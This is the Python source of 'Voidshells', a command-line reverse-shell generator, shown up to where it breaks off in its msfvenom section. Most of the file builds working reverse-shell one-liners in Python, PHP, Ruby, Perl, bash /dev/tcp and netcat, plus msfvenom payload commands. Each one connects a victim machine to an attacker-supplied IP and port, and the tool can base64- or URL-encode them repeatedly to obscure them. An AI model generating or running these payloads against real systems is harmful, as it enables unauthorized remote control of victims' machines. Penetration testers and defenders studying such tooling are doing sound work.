import argparse 
from argparse import RawTextHelpFormatter
import base64
import sys
import urllib.parse
from colorama import Fore, just_fix_windows_console
just_fix_windows_console()


def tool_banner():
    print(Fore.WHITE + """

██╗   ██╗ ██████╗ ██╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     ███████╗     
██║   ██║██╔═══██╗██║██╔══██╗██╔════╝██║  ██║██╔════╝██║     ██║     ██╔════╝ 
██║   ██║██║   ██║██║██║  ██║███████╗███████║█████╗  ██║     ██║     ███████╗   
╚██╗ ██╔╝██║   ██║██║██║  ██║╚════██║██╔══██║██╔══╝  ██║     ██║     ╚════██║
 ╚████╔╝ ╚██████╔╝██║██████╔╝███████║██║  ██║███████╗███████╗███████╗███████║ 
  ╚═══╝   ╚═════╝ ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝  V 1.0 by Void4m0n  
""" + Fore.RESET +
Fore.CYAN + """

twitter  --> https://twitter.com/Void4m0n
linkedin --> https://www.linkedin.com/in/luis-miranda-sierra/
""" + Fore.RESET)

# Function that close the program
def exit_program():
    print(Fore.RED + "\n[X] Closing script..." + Fore.RESET)
    sys.exit(0) 

# Function that save the user input in args, using argparse.
def user_input():
    

    # Custom default panel 
    parser = argparse.ArgumentParser(formatter_class=RawTextHelpFormatter, usage="""
                              
    \rVoidshell.py [-h] -i LHOST -p LPORT -o OPERATIVE_SYSTEM [OPERATIVE_SYSTEM ...] -l LANGUAGE [LANGUAGE ...] [-s UNIX_SHELL [UNIX_SHELL ...]] [-pv PYVERSION]
                    [-c ENCODE [ENCODE ...]] [-n N_ENCODER]
    \rExamples:
    
    \rpython3 Voidshells.py -i 192.168.1.1 -p 1234 -o windows -l powershell
    \rpython3 Voidshells.py -i 192.168.1.1 -p 1234 -o linux -l bash -s bash -c base64 url
    \rpython3 Voidshells.py -i 192.168.1.1 -p 1234 -o linux -l python perl -pv 3 -s bash -c base64 url -n 2
    \rpython3 Voidshells.py -i 192.168.1.1 -p 1234 -o linux windows -l nc -s bash
    """)

    # Arguments definition
    parser.add_argument('-i', dest="lhost", type=str, required=True, help='Attacker IP, Ex: 10.10.10.10\n\n')
    parser.add_argument('-p', dest="lport", type=int, required=True, help='Attacker listening port, Ex: 1234\n\n')
    parser.add_argument('-o', dest="os", type=str, required=True, nargs='+', help='Victim operating system, Ex: linux windows.\n\n')
    parser.add_argument('-l', dest="language", type=str, required=True, nargs='+', help='Reverse shell language, Ex: python php\n\n'  + 'Linux: python, php, bash, ruby, perl, nc, msfvenom, all\n' \
    + 'Windows: nc, powershell, python, msfvenom, all.\n\n')
    parser.add_argument('-s', dest="Unix_shell", type=str, required=False, nargs='+', help='Attacker Type of Unix shell, Ex: sh bash zsh.\n\n')       
    parser.add_argument('-pv', dest="Pyversion", type=str, required=False, help='Select the version of python, Ex: 3 \n\n')
    parser.add_argument('-c', dest="Encode", type=str, required=False, nargs='+', help='Select type of encode, Ex: base64 url.\n\n')
    parser.add_argument('-n', dest="N_encoder", type=int, required=False, help='Number of times to encode the reverse shell. Ex: 2 (default 1)\n\n')
    
    # Processed arguments    
    args = parser.parse_args()

    return args 


# Main function
def revshellgen(user_lhost, user_lport, user_shell_language, user_shell_encode, user_operative_system, user_python_shell_version, user_number_encode, user_unix_shell):
    
    # Check if the ip given is valid, and saved in user_lhost
    user_lhost = check_ip(user_lhost)

    # Check if the port given is valid
    check_port(user_lport)


    # Check if the operating systems provided for the user are valid.
    check_operative_system(user_operative_system)


    # Check if the user language is supported
    check_user_shell_language(user_operative_system, user_shell_language)


    # Check if the python version is 3, None or not supported and save the value in the variable
    user_python_shell_version = python_version_check(user_python_shell_version)
    
    
    # Check if the user input type encoding is valid with encode_checker() and save the value in the variable
    user_shell_encode = encode_checker(user_shell_encode)


    #Check if the number of encode time is valid and save the value in the variable
    user_number_encode = number_encode_checker(user_number_encode)

    
    if 'linux' in user_operative_system:

        print(banners["banner_linux"])
        # Main function to create the Unix reverses shells
        Unix_revshells(user_shell_encode, user_number_encode, user_python_shell_version, user_lhost, user_unix_shell)


    if 'windows' in user_operative_system:

        print(banners["banner_windows"])
        # Main function to create the Windows reverses shells
        Windows_revshells(user_shell_encode, user_number_encode, user_python_shell_version)


def check_ip(user_lhost):
    
    # Clean spaces of the given IP
    ip_clean = user_lhost.replace(' ', '')
    

    # Split the ip using . like delimiter
    spliter = ip_clean.split('.')

    # Check if some octect is empty 
    if '' in spliter:
        print(Fore.YELLOW + "[!] The IP should be composed of 4 octets, probably some octets are null like the following: 192..0.1 or 192.168.0.\n\n"
        + Fore.WHITE + "[&] User input: " + user_lhost + Fore.LIGHTMAGENTA_EX + "\n\n[?] Ex: -i 192.168.1.1" + Fore.RESET)

        

        exit_program()

    # Validate if the ip splited is different to 4 pieces
    if len(spliter) != 4:
        Octects_number = len(spliter)
        print(Fore.YELLOW + "[!] The IP should be composed of 4 octets, the IP given has " + Fore.GREEN + f"{Octects_number} octets" + 
              Fore.YELLOW +  " please check the syntax, Ex: 192.168.0.1\n\n"
        + Fore.WHITE + "[&] User input: " + user_lhost + Fore.LIGHTMAGENTA_EX + "\n\n[?] Ex: -i 192.168.1.1" + Fore.RESET)
        exit_program()

    # Validate that the octets are between 0 and 255.
    for split_part in spliter:
        
        split_part = int(split_part)

        if split_part not in range (0,256):

            print(Fore.YELLOW + "[!] The IP should be composed of 4 octets, this octets must be between 0 and 255, your octets are the following: " + Fore.RESET + Fore.GREEN + str(spliter) + Fore.RESET
            + Fore.WHITE + "\n\n[&] User input: " + user_lhost + Fore.LIGHTMAGENTA_EX + "\n\n[?] Ex: -i 192.168.1.1" + Fore.RESET)
            exit_program()

        else:
            pass

    # if all the checks are okey return the ip cleaned
    return ip_clean
    
def check_port(user_lport):
    # Check if the user input is a valid port between 0 and 65536
    if user_lport not in range(0,65536):

        print(Fore.YELLOW + "[!] Port select not valid, the port should be between " +  Fore.GREEN + "0" + Fore.YELLOW + " and " 
        + Fore.GREEN + "65535" + Fore.WHITE + "\n\n[&] User input: " + str(user_lport) + Fore.LIGHTMAGENTA_EX + "\n\n[?] Ex: -p 1234" + Fore.RESET)
        exit_program()

    else:
        return

def python_version_check(user_python_shell_version):

    # Check if the version of python is 3 and then return
    if user_python_shell_version == '3':
        return user_python_shell_version

    # Check if the value is none, overwrite value with empty string and return
    elif user_python_shell_version == None:
        user_python_shell_version = ''
        return user_python_shell_version
    
    # Error menssage when the python version is not supported.
    else: 
        print(Fore.YELLOW + "[!] Python version not supported, the supported one is " + Fore.RESET + Fore.GREEN + "3" + Fore.RESET +  
        Fore.WHITE + "\n\n[&] User input: " + str(user_python_shell_version) + Fore.LIGHTMAGENTA_EX + "\n\n[?] Ex: -pv 3" + Fore.RESET)
        exit_program()
     

def encode_checker(user_shell_encode):

        # When the user_shell_encode is equal to None overwrite the value to the string 'plain' and return the value
        if user_shell_encode is None:

            user_shell_encode = 'plain'
            return user_shell_encode
        
        # Loop checking if the encode type is not supported based on the dict encode_types_support
        elif not all(encode_cheker in encode_types_supported for encode_cheker in user_shell_encode):

            print(Fore.YELLOW + "[!] Type of encode not supported, the encode type supported are the folowing\n" + Fore.RESET)   
            contador = 0

            for encode_suported in encode_types_supported:
                contador = contador + 1
                print(Fore.GREEN + '[' + str(contador) + '] ' + encode_suported + Fore.RESET)
            
            # User shell encode input menssage
            user_shell_encode = list_to_string(user_shell_encode)
            print(Fore.WHITE + "\n[&] User input: " + user_shell_encode + Fore.RESET)

            # User shell encode usage
            print(Fore.LIGHTMAGENTA_EX + "\n[?] Ex: -c url base64" + Fore.RESET)
            exit_program()

        # Loop checking if the encode type is supported based on the dict encode_types_support
        elif all(encode_cheker in encode_types_supported for encode_cheker in user_shell_encode):
            return user_shell_encode
        
        # Unexpected error
        else:
            exit_program()



def number_encode_checker(user_number_encode):

    # If user_number_encode is None settig the value to 1
    if user_number_encode is None:        
        user_number_encode = 1
        return user_number_encode
    
    # Range checker for the encoder
    if 1 <= user_number_encode <= 20:
        return user_number_encode
    
    # if user_number encode is bigger than 20 call exit_program() avoiding machine crashes
    elif user_number_encode > 20:
        print(Fore.YELLOW + "[!] A big number could crash the machine, for safety the script will close when the number is bigger than " 
        + Fore.GREEN + "20" + Fore.WHITE + "\n\n[&] User input: " + str(user_number_encode) + Fore.LIGHTMAGENTA_EX + "\n\n[?] Ex: -n 2" + Fore.RESET)

        # User shell encode input menssage
        exit_program()

    # Error menssage
    else:
        print(Fore.YELLOW + "[!] The number should be between " + Fore.GREEN + "1" + Fore.YELLOW + " and " + Fore.GREEN + "20 "
        + Fore.WHITE + "\n\n[&] User input: " + str(user_number_encode) + Fore.LIGHTMAGENTA_EX + "\n\n[?] Ex: -n 2" + Fore.RESET)
        exit_program()




def check_operative_system(user_operative_system):

    # Check if the OS provided is part of the list opertative_systems_supported
    if not all(operative_system_checker in operative_systems_supported for operative_system_checker in user_operative_system):
        
        print(Fore.YELLOW + "\n[!] Operative system not supported, the OS supported are the folowing:\n" + Fore.RESET)
        contador = 0

        for operative_system in operative_systems_supported:
            contador = contador + 1
            print(Fore.GREEN + '[' + str(contador) + '] ' + operative_system + Fore.RESET)

        # User shell language input menssage
        user_operative_system = list_to_string(user_operative_system)
        print(Fore.WHITE + "\n[&] User input: " + user_operative_system + Fore.RESET)

        # User shell Language usage example
        print(Fore.LIGHTMAGENTA_EX + "\n[?] Usage Ex: -o linux windows" + Fore.RESET)

        exit_program()

    # When the os is suppoerted, return.
    else:
        return




def check_user_shell_language(user_operative_system, user_shell_language):
    
    # boolean errors checkers declared
    error_language_linux = False
    error_language_windows = False

    # if the os is linux and windows then check if the languge is supported for the os independently
    if 'linux' in user_operative_system and 'windows' in user_operative_system:

        # Check if the user_shell_language is part of the dict unix_code_languages_supported
        if not all(language_checker in unix_code_languages_supported for language_checker in user_shell_language):

            print(Fore.YELLOW + "\n[!] Code languge not supported, the language supported for Linux are the folowing:\n" + Fore.RESET)   
            contador = 0
            error_language_linux = True

            for language_supported in unix_code_languages_supported:
                contador = contador + 1
                print(Fore.GREEN + '[' + str(contador) + '] ' + language_supported + Fore.RESET)

            # User shell language input menssage
            user_shell_language_linux = list_to_string(user_shell_language)
            print(Fore.WHITE + "\n[&] User input: " + user_shell_language_linux + Fore.RESET)

            # User shell Language usage example
            print(Fore.LIGHTMAGENTA_EX + "\n[?] Usage Ex: -l python php bash\n" + Fore.RESET)

        
        # Check if the user_shell_language is part of the dict windows_code_languages_supported
        if not all (windows_language_checker in windows_code_languages_supported for windows_language_checker in user_shell_language):

                print(Fore.YELLOW + "\n[!] Code languge not supported, the language supported for Windows are the folowing:\n" + Fore.RESET)   
                contador = 0
                error_language_windows = True

                for language_supported in windows_code_languages_supported:
                    contador = contador + 1
                    print(Fore.GREEN + '[' + str(contador) + '] ' + language_supported + Fore.RESET)

                # User shell language input menssage
                user_shell_language_windows = list_to_string(user_shell_language)
                print(Fore.WHITE + "\n[&] User input: " + user_shell_language_windows + Fore.RESET)

                # User shell Language usage example
                print(Fore.LIGHTMAGENTA_EX + "\n[?] Ex: -l poweshell nc python" + Fore.RESET)

        # When both os don t support the user_shell_language provided then exit program
        if error_language_linux == True or error_language_windows == True:
            exit_program()        

        


    elif 'linux' in user_operative_system:

        # Check if the user_shell_language is part of the dict unix_code_languages_supported
        if not all(language_checker in unix_code_languages_supported for language_checker in user_shell_language):
            print(Fore.YELLOW + "\n[!] Code languge not supported, the language supported for Linux are the folowing:\n" + Fore.RESET)   
            contador = 0

            for language_supported in unix_code_languages_supported:
                contador = contador + 1
                print(Fore.GREEN + '[' + str(contador) + '] ' + language_supported + Fore.RESET)


            # User shell language input menssage
            user_shell_language_linux = list_to_string(user_shell_language)
            print(Fore.WHITE + "\n[&] User input: " + user_shell_language_linux + Fore.RESET)

            # User shell Language usage example
            print(Fore.LIGHTMAGENTA_EX + "\n[?] Usage Ex: -l python php bash" + Fore.RESET)

            exit_program()

    if 'windows' in user_operative_system:
        
        # Check if the user_shell_language is part of the dict windows_code_languages_supported
        if not all (windows_language_checker in windows_code_languages_supported for windows_language_checker in user_shell_language):
            print(Fore.YELLOW + "\n[!] Code languge not supported, the language supported for Windows are the folowing:\n"  + Fore.RESET)   
            contador = 0

            for language_supported in windows_code_languages_supported:
                contador = contador + 1
                print(Fore.GREEN + '[' + str(contador) + '] ' + language_supported + Fore.RESET)
            
            
            # User shell language input menssage
            user_shell_language_windows = list_to_string(user_shell_language)
            print(Fore.WHITE + "\n[&] User input: " + user_shell_language_windows + Fore.RESET)

            # User shell Language usage example
            print(Fore.LIGHTMAGENTA_EX + "\n[?] Ex: -l poweshell nc python" + Fore.RESET)

            exit_program()
    

        



def check_unix_shell(user_unix_shell):

    # When user_unix_shell is none exit program
    if user_unix_shell == None:
        print(Fore.YELLOW + "[!] Especify at least one type of shell between:\n" + Fore.RESET)
        contador = 0
        
        for unix_supported in unix_shell_supported:
            contador = contador + 1
            print(Fore.GREEN + '[' + str(contador) + '] ' + unix_supported + Fore.RESET)
        
        # Usage menssage
        print(Fore.LIGHTMAGENTA_EX + "\n[?] Ex: -s sh bash" + Fore.RESET)
        
        exit_program()

    # if user_unix_shell is not in the list unix_shell_supported, exit program)
    elif not all(unix_shell_checker in unix_shell_supported for unix_shell_checker in user_unix_shell):
        print(Fore.YELLOW + "[!] Unix shell not supported, the shells supported are the folowing\n" + Fore.RESET)   
        contador = 0

        for unix_supported in unix_shell_supported:
            contador = contador + 1
            print(Fore.GREEN  + '[' + str(contador) + '] ' + unix_supported + Fore.RESET)

        # User_unix_shell input menssage
        user_unix_shell = list_to_string(user_unix_shell)
        print(Fore.WHITE + "\n[&] User input: " + user_unix_shell + Fore.RESET)

        # Usage menssage
        print(Fore.LIGHTMAGENTA_EX + "\n[?] Usage Ex: -s sh bash" + Fore.RESET)

        exit_program()
    # otherwise, return
    else:
        return





def Unix_revshells(user_shell_encode, user_number_encode, user_python_shell_version, user_lhost, user_unix_shell):

    if 'bash' in user_shell_language:
        check_unix_shell(user_unix_shell)
        print(banners["banner_bash"])
        bash_unix_shells(user_unix_shell, user_shell_encode, user_number_encode, user_lhost)

    if 'python' in user_shell_language:
        check_unix_shell(user_unix_shell)
        print(banners["banner_python"])
        python_unix_shells(user_unix_shell, user_shell_encode, user_number_encode, user_python_shell_version, user_lhost)
        
    if 'php' in user_shell_language:
        check_unix_shell(user_unix_shell)
        print(banners["banner_php"])
        php_unix_shells(user_unix_shell, user_shell_encode, user_number_encode, user_lhost)

    if 'ruby' in user_shell_language:
        check_unix_shell(user_unix_shell)
        print(banners["banner_ruby"])
        ruby_unix_shells(user_unix_shell, user_shell_encode, user_number_encode, user_lhost)

    if 'perl' in user_shell_language:
        check_unix_shell(user_unix_shell)
        print(banners["banner_perl"])
        perl_unix_shells(user_unix_shell, user_shell_encode, user_number_encode, user_lhost)
    
    if 'nc' in user_shell_language:
        check_unix_shell(user_unix_shell)
        print(banners["banner_nc"])
        nc_unix_shells(user_unix_shell, user_shell_encode, user_number_encode, user_lhost)
    
    if 'msfvenom' in user_shell_language:
        print(banners["banner_msfvenom"])
        msfvenom_unix_payloads(user_lhost, user_lport)


    if  'all' in user_shell_language:
        check_unix_shell(user_unix_shell)

        print(banners["banner_bash"])
        bash_unix_shells(user_unix_shell, user_shell_encode, user_number_encode, user_lhost)

        print(banners["banner_python"])
        python_unix_shells(user_unix_shell, user_shell_encode, user_number_encode, user_python_shell_version, user_lhost)

        print(banners["banner_php"])
        php_unix_shells(user_unix_shell, user_shell_encode, user_number_encode, user_lhost)

        print(banners["banner_ruby"])
        ruby_unix_shells(user_unix_shell, user_shell_encode, user_number_encode, user_lhost)

        print(banners["banner_perl"])
        perl_unix_shells(user_unix_shell, user_shell_encode, user_number_encode, user_lhost)

        print(banners["banner_nc"])
        nc_unix_shells(user_unix_shell, user_shell_encode, user_number_encode, user_lhost)

        print(banners["banner_msfvenom"])
        msfvenom_unix_payloads(user_lhost, user_lport)



def python_unix_shells(user_unix_shell, user_shell_encode, user_number_encode, user_python_shell_version, user_lhost):
    
    # Loop to add support for sh, bash and zsh shells
    for i in user_unix_shell:
        user_unix_shell = i

        # Banner for the unix shell
        user_unix_shell_banner(user_unix_shell)

        # PYTHON REVERSE SHELLS

        # Python reverse shell not exported variables
        python_reverse_shell_not_export = f"python{user_python_shell_version} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{user_lhost}\",{user_lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/{user_unix_shell}\")'"
        msg_python_reverse_shell_not_export = "[*] Not export varibles python"
        python_reverse_shell_not_export_msg_format = ('\n' + Fore.YELLOW + msg_python_reverse_shell_not_export + Fore.RESET)
        encoder(python_reverse_shell_not_export, python_reverse_shell_not_export_msg_format, user_number_encode, user_shell_encode, msg_python_reverse_shell_not_export)


        # Python reverse shell exporting variables
        python_reverse_shell_export = f"export RHOST=\"{user_lhost}\";export RPORT={user_lport};python{user_python_shell_version} -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/{user_unix_shell}\")'"
        msg_python_reverse_shell_export = "[*] Exporting varibles"
        python_reverse_shell_export_msg_format = ('\n' + Fore.YELLOW + msg_python_reverse_shell_export + Fore.RESET)
        encoder(python_reverse_shell_export, python_reverse_shell_export_msg_format, user_number_encode, user_shell_encode, msg_python_reverse_shell_export)

        # Python reverse shells shortest versios
        python_reverse_shell_shortest = f"python{user_python_shell_version} -c 'import os,pty,socket;s=socket.socket();s.connect((\"{user_lhost}\",{user_lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/{user_unix_shell}\")'"
        msg_python_reverse_shell_shortest = "[*] Shortest version" 
        python_reverse_shell_shortest_msg_format = ('\n' + Fore.YELLOW + msg_python_reverse_shell_shortest + Fore.RESET)
        encoder(python_reverse_shell_shortest, python_reverse_shell_shortest_msg_format, user_number_encode, user_shell_encode, msg_python_reverse_shell_shortest)


def php_unix_shells(user_unix_shell, user_shell_encode, user_number_encode, user_lhost):
    for i in user_unix_shell:
        user_unix_shell = i
        
        # Banner for the unix shell
        user_unix_shell_banner(user_unix_shell)

        # PHP REVERSE SHELLS

        # Function exec
        php_exec_reverse_shell = f"php -r '$sock=fsockopen(\"{user_lhost}\",{user_lport});exec(\"/bin/{user_unix_shell} <&3 >&3 2>&3\");'"
        msg_php_exec_reverse_shell = "[*] FUNCTION: PHP_EXEC"
        php_exec_reverse_shell_msg_format = ('\n' + Fore.MAGENTA + msg_php_exec_reverse_shell + Fore.RESET)
        encoder(php_exec_reverse_shell, php_exec_reverse_shell_msg_format, user_number_encode, user_shell_encode, msg_php_exec_reverse_shell)


        # Function shell_exec
        php_shell_exec_reverse_shell = f"php -r '$sock=fsockopen(\"{user_lhost}\",{user_lport});shell_exec(\"/bin/{user_unix_shell} <&3 >&3 2>&3\");'"
        msg_php_shell_exec_reverse_shell = "[*] FUNCTION: SHELL_EXEC"
        php_shell_exec_reverse_shell_msg_format = ('\n' + Fore.MAGENTA + msg_php_shell_exec_reverse_shell + Fore.RESET)
        encoder(php_shell_exec_reverse_shell, php_shell_exec_reverse_shell_msg_format, user_number_encode, user_shell_encode, msg_php_shell_exec_reverse_shell)


        # Function system
        php_system_reverse_shell = f"php -r '$sock=fsockopen(\"{user_lhost}\",{user_lport});system(\"/bin/{user_unix_shell} <&3 >&3 2>&3\");'"
        msg_php_system_reverse_shell = "[*] FUNCTION: SYSTEM"
        php_system_reverse_shell_msg_format = ('\n' + Fore.MAGENTA + msg_php_system_reverse_shell + Fore.RESET)
        encoder(php_system_reverse_shell, php_system_reverse_shell_msg_format, user_number_encode, user_shell_encode, msg_php_system_reverse_shell)


        # Function passthru
        php_passthru_reverse_shell = f"php -r '$sock=fsockopen(\"{user_lhost}\",{user_lport});passthru(\"/bin/{user_unix_shell} <&3 >&3 2>&3\");'"
        msg_php_passthru_reverse_shell = "[*] FUNCTION: PASSTHRU"
        php_passthru_reverse_shell_msg_format = ('\n' + Fore.MAGENTA + msg_php_passthru_reverse_shell + Fore.RESET)
        encoder(php_passthru_reverse_shell, php_passthru_reverse_shell_msg_format, user_number_encode, user_shell_encode, msg_php_passthru_reverse_shell)


        # Function `
        php_apostrophe_reverse_shell = f"php -r '$sock=fsockopen(\"{user_lhost}\",{user_lport});`/bin/{user_unix_shell}  <&3 >&3 2>&3`;'"
        msg_php_apostrophe_reverse_shell = "[*] APOSTROPHE"
        php_apostrophe_reverse_shell_msg_format = ('\n' + Fore.MAGENTA + msg_php_apostrophe_reverse_shell + Fore.RESET)
        encoder(php_apostrophe_reverse_shell, php_apostrophe_reverse_shell_msg_format, user_number_encode, user_shell_encode, msg_php_apostrophe_reverse_shell)


        # Function poopen
        php_popen_reverse_shell = f"php -r '$sock=fsockopen(\"{user_lhost}\",{user_lport});popen(\"/bin/{user_unix_shell} <&3 >&3 2>&3\", \"r\");'"
        msg_php_popen_reverse_shell = "[*] FUNCTION: POPEN"
        php_popen_reverse_shell_msg_format = ('\n' + Fore.MAGENTA + msg_php_popen_reverse_shell + Fore.RESET)
        encoder(php_popen_reverse_shell, php_popen_reverse_shell_msg_format, user_number_encode, user_shell_encode, msg_php_popen_reverse_shell)


        #Function proc_open 
        php_proc_open_reverse_shell = f"php -r '$sock=fsockopen(\"{user_lhost}\",{user_lport});$proc=proc_open(\"/bin/{user_unix_shell}\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
        msg_php_proc_open_reverse_shell = "[*] FUNCTION: PROC OPEN"
        php_proc_open_reverse_shell_msg_format = ('\n' + Fore.MAGENTA + msg_php_proc_open_reverse_shell + Fore.RESET)
        encoder(php_proc_open_reverse_shell, php_proc_open_reverse_shell_msg_format, user_number_encode, user_shell_encode, msg_php_proc_open_reverse_shell)


def ruby_unix_shells(user_unix_shell, user_shell_encode, user_number_encode, user_lhost):

    # Banner for the unix shell
    not_user_unix_shell_banner()

    #Ruby Not sh shell
    ruby_reverse_shell_unix_not_sh = f"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{user_lhost}\",\"{user_lport}\");loop{{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){{|io|c.print io.read}}))rescue c.puts \"failed: #{{$_}}\"}}'"
    msg_ruby_reverse_shell_unix_not_sh = "[*] RUBY NOT SH SHELL"
    ruby_reverse_shell_unix_not_sh_msg_format = ('\n' + Fore.RED + msg_ruby_reverse_shell_unix_not_sh + Fore.RESET)

    encoder(ruby_reverse_shell_unix_not_sh, ruby_reverse_shell_unix_not_sh_msg_format, user_number_encode, user_shell_encode, msg_ruby_reverse_shell_unix_not_sh)

    for i in user_unix_shell:
        user_unix_shell = i 

        # MSG OF THE UNIX SHELL DELECTED
        user_unix_shell_banner(user_unix_shell)

        #REVERSE SHELLS RUBY
        ruby_reverse_shell_unix = f"ruby -rsocket -e'spawn(\"{user_unix_shell}\",[:in,:out,:err]=>TCPSocket.new(\"{user_lhost}\",{user_lport}))'"
        msg_ruby_reverse_shell_unix = "[*] RUBY UNIX SHELL SPAWN"
        ruby_reverse_shell_unix_msg_format = ('\n' + Fore.RED + msg_ruby_reverse_shell_unix + Fore.RESET)
        
        encoder(ruby_reverse_shell_unix, ruby_reverse_shell_unix_msg_format, user_number_encode, user_shell_encode, msg_ruby_reverse_shell_unix)


def perl_unix_shells(user_unix_shell, user_shell_encode, user_number_encode, user_lhost):

    not_user_unix_shell_banner()

    # PERL SHELL INDEPENDENT    
    perl_reverse_shell_not_sh = f"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{user_lhost}:{user_lport}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
    msg_perl_reverse_shell_not_sh= "[*] PERL NOT SH SHELL"
    perl_reverse_shell_not_sh_msg_format = ('\n' + Fore.WHITE + msg_perl_reverse_shell_not_sh + Fore.RESET)

    encoder(perl_reverse_shell_not_sh, perl_reverse_shell_not_sh_msg_format, user_number_encode, user_shell_encode, msg_perl_reverse_shell_not_sh)
    
    for i in user_unix_shell:
        user_unix_shell = i

        # MSG OF THE UNIX SHELL DELECTED
        user_unix_shell_banner(user_unix_shell)

        # REVERSE SHELL PERL
        perl_reverse_shell_unix = f"perl -e 'use Socket;$i=\"{user_lhost}\";$p={user_lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/{user_unix_shell} -i\");}};'"
        msg_per_reverse_shell_unix_msg = "[*] PERL UNIX SHELL SPAWN"
        perl_reverse_shell_unix_msg_format = ('\n' + Fore.WHITE + msg_per_reverse_shell_unix_msg + Fore.RESET)

        encoder(perl_reverse_shell_unix, perl_reverse_shell_unix_msg_format, user_number_encode, user_shell_encode, msg_per_reverse_shell_unix_msg)

def bash_unix_shells(user_unix_shell, user_shell_encode, user_number_encode, user_lhost):

    # BASH READ LINE
    bash_reverse_shell_exec = f"bash -c \"exec 5<>/dev/tcp/{user_lhost}/{user_lport};cat <&5 | while read line; do $line 2>&5 >&5; done\""
    msg_bash_reverse_shell_exec = "[*] BASH READ LINE REVERSE SHELL:"
    bash_reverse_shell_exec_msg_format = ('\n' + Fore.RED + msg_bash_reverse_shell_exec + Fore.RESET)
    encoder(bash_reverse_shell_exec, bash_reverse_shell_exec_msg_format, user_number_encode, user_shell_encode, msg_bash_reverse_shell_exec)


    for i in user_unix_shell:
        user_unix_shell = i

        # print Banner with the unix shell languague
        user_unix_shell_banner(user_unix_shell)

        # common reverse shell in bash
        bash_reverse_shell = f"bash -c \"/bin/{user_unix_shell} -i >& /dev/tcp/{user_lhost}/{user_lport} 0>&1\""
        msg_bash_revrshe_shell = "[*] BASH UNIX SHELL SPAWN"
        bash_reverse_shell_msg_format = ('\n' + Fore.RED + msg_bash_revrshe_shell + Fore.RESET)
        encoder(bash_reverse_shell, bash_reverse_shell_msg_format, user_number_encode, user_shell_encode, msg_bash_revrshe_shell)

        # bash 5 reverse shell
        bash_reverse_shell_5 = f"bash -c \"/bin/{user_unix_shell} -i 5<> /dev/tcp/{user_lhost}/{user_lport} 0<&5 1>&5 2>&5\""
        msg_bash_5_reverse_shell = "[*] BASH 5 UNIX SHELL SPAWN" 
        bash_reverse_shell_5_msg_format = ('\n' + Fore.RED + msg_bash_5_reverse_shell + Fore.RESET)
        encoder(bash_reverse_shell_5, bash_reverse_shell_5_msg_format, user_number_encode, user_shell_encode, msg_bash_5_reverse_shell)

def nc_unix_shells(user_unix_shell, user_shell_encode, user_number_encode, user_lhost):
    
    for i in user_unix_shell:
        user_unix_shell = i

        # print Banner with the unix shell languague
        user_unix_shell_banner(user_unix_shell)
        

        # nc mkfifo shell
        nc_mkfifo_reverse_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/{user_unix_shell} -i 2>&1|nc {user_lhost} {user_lport} >/tmp/f"
        msg_nc_mkfifo = "[*] NC mkfifo reverse shell:" 
        nc_mkfifo_reverse_shell_msg = ('\n' + Fore.CYAN + "[*] NC mkfifo reverse shell:" + Fore.RESET)
        encoder(nc_mkfifo_reverse_shell, nc_mkfifo_reverse_shell_msg, user_number_encode, user_shell_encode, msg_nc_mkfifo)


        # nc -e reverse shell
        nc_e_reverse_shell = f"nc {user_lhost} {user_lport} -e /bin/{user_unix_shell}"
        msg_nc_e = "[*] NC -e reverse shell:"
        nc_e_reverse_shell_msg = ('\n' + Fore.CYAN + msg_nc_e + Fore.RESET)
        encoder(nc_e_reverse_shell, nc_e_reverse_shell_msg, user_number_encode, user_shell_encode, msg_nc_e)


        # nc -c reverse shell
        nc_c_reverse_shell = f"nc -c /bin/{user_unix_shell} {user_lhost} {user_lport}"
        msg_nc_c = "[*] NC -c reverse shell:"
        nc_c_reverse_shell_msg = ('\n' + Fore.CYAN + msg_nc_c + Fore.RESET)
        encoder(nc_c_reverse_shell, nc_c_reverse_shell_msg, user_number_encode, user_shell_encode, msg_nc_c)

def msfvenom_unix_payloads(user_lhost, user_lport):

    print("\n•───────────────( " + Fore.BLUE + "NON METERPRETER STAGELESS PAYLOADS" + Fore.RESET + " )───────────────•\n")


    # msfvenom rerverse shell TCP x64 Stageless
    msfvenom_reverse_shell_unix_64_Stageless = f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={user_lhost} LPORT={user_lport} -f elf > shell_x64_Stageless.elf"
    msg_msfvenom_reverse_shell_unix_64_Stageless  = "[*] Msfvenom unix TCP reverse shell x64 Stageless:"
    msfvenom_reverse_shell_unix_64_msg_format_Stageless  = Fore.RED + "[*] Msfvenom unix TCP reverse shell " + Fore.GREEN + "x64" + Fore.CYAN + " Stageless:" + Fore.RESET
    
    print('\n' + msfvenom_reverse_shell_unix_64_msg_format_Stageless )
    reverse_shell_separator(msg_msfvenom_reverse_shell_unix_64_Stageless )
    print(Fore.GREEN + "\n[*] PAYLOAD: \n" + Fore.RESET)
    print(msfvenom_reverse_shell_unix_64_Stageless  + '\n')


    # Msfvenom reverse shell TCP x86 Stageless
    msfvenom_reverse_shell_unix_86_Stageless  = f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={user_lhost} LPORT={user_lport} -f elf > shell_x86_Stageless.elf"
    msg_msfvenom_reverse_shell_unix_86_Stageless  = "[*] Msfvenom unix TCP reverse shell x86 Stageless:"
